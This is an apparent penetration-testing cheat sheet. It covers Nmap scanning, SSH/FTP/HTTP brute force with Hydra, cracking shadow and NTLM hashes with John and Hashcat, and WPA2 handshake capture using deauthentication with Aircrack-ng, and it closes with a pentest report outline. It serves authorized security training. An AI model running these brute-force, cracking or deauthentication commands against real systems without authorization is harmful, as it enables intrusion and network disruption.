01 Nmap — Port & Service Scanning ACTIVE ▶

Basic Scan Cheatsheet

CommandWhat it does
nmap -sV TARGETService version detection
nmap -sS TARGETStealth SYN scan (root required)
nmap -sU TARGETUDP port scan
nmap -p- TARGETAll 65535 ports
nmap --script vuln TARGETRun vulnerability scripts
nmap -sC -sV -p- -oN out.txtFull scan, save output

Full Enumeration Scan

kali# TARGET=192.168.1.100
kali# nmap -sC -sV -p- -T4 \
      --min-rate 1000 \
      -oN full_scan.txt \
      $TARGET

# Vuln scan with NSE scripts
kali# nmap --script=vuln,exploit \
      -sV -p 80,443,22,21,3306 \
      $TARGET

Specific Service Scripts

# SMB enumeration
kali# nmap --script smb-enum-shares,smb-enum-users \
      -p 445 $TARGET

# HTTP banner & methods
kali# nmap --script http-methods,http-headers \
      -p 80,8080,443 $TARGET

# FTP anonymous login check
kali# nmap --script ftp-anon -p 21 $TARGET

02 Password Attacks — Hydra & John the Ripper EXPLOIT ▶

Hydra — Online Brute Force

# SSH brute force
kali# hydra -l admin -P /usr/share/wordlists/rockyou.txt \
        ssh://192.168.1.100 -t 4 -V

# HTTP form login
kali# hydra -l admin -P rockyou.txt \
        192.168.1.100 http-post-form \
        "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP brute force
kali# hydra -L users.txt -P passes.txt ftp://192.168.1.100

John the Ripper — Offline Hash Cracking

# Crack Linux /etc/shadow
kali# unshadow /etc/passwd /etc/shadow > hashes.txt
kali# john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack NTLM Windows hashes
kali# john --format=NT hashes.txt --wordlist=rockyou.txt
kali# john --show hashes.txt   # Show cracked

Hashcat — GPU-accelerated Cracking

# MD5 (-m 0), SHA1 (-m 100), NTLM (-m 1000)
kali# hashcat -m 0 -a 0 hashes.txt rockyou.txt
kali# hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a \
        --increment  # Brute all combos up to 6 chars

01 Aircrack-ng Suite — WPA2 Handshake Capture WIRELESS ▶

Step 1 — Enable Monitor Mode

kali# iwconfig          # Find interface (wlan0, wlan1)
kali# airmon-ng check kill    # Kill interfering processes
kali# airmon-ng start wlan0   # Creates wlan0mon
kali# iwconfig wlan0mon       # Verify monitor mode

Step 2 — Scan for Networks

kali# airodump-ng wlan0mon
# Note target BSSID (MAC) and CH (channel)

Step 3 — Capture Handshake

# Lock to target AP
kali# airodump-ng --bssid AA:BB:CC:DD:EE:FF \
              --channel 6 \
              --write capture \
              wlan0mon

# In another terminal — deauth a client to force reconnect
kali# aireplay-ng --deauth 5 \
              -a AA:BB:CC:DD:EE:FF \
              wlan0mon
# Watch for [ WPA handshake: AA:BB:CC:DD:EE:FF ]

Step 4 — Crack the Handshake

kali# aircrack-ng capture-01.cap \
        -w /usr/share/wordlists/rockyou.txt

# Or use hashcat (faster with GPU)
kali# hcxpcapngtool capture-01.cap -o hash.hc22000
kali# hashcat -m 22000 hash.hc22000 rockyou.txt

Restore Normal Mode

kali# airmon-ng stop wlan0mon
kali# service NetworkManager start

01 Pentest Report Structure DELIVERABLE ▶

A professional pentest report must be clear, reproducible, and risk-rated. Below is the standard structure:

  1. Executive Summary — High-level findings for management. No jargon. Focus on business risk.
  2. Scope & Rules of Engagement — IPs tested, dates, methods permitted, out-of-scope items.
  3. Methodology — Phases: Recon → Scanning → Exploitation → Post-exploitation → Cleanup.
  4. Findings — Each vulnerability with: CVE, severity (CVSS score), proof (screenshot/command output), and reproduction steps.
  5. Risk Ratings — Critical / High / Medium / Low / Informational using CVSS 3.1.
  6. Remediation Recommendations — Specific, actionable fixes for each finding.
  7. Appendices — Raw tool output, network diagrams, raw command logs.

CVSS Severity Scale

ScoreSeverityColor
9.0–10.0Critical■ Critical
7.0–8.9High■ High
4.0–6.9Medium■ Medium
0.1–3.9Low■ Low
0.0Informational■ Info
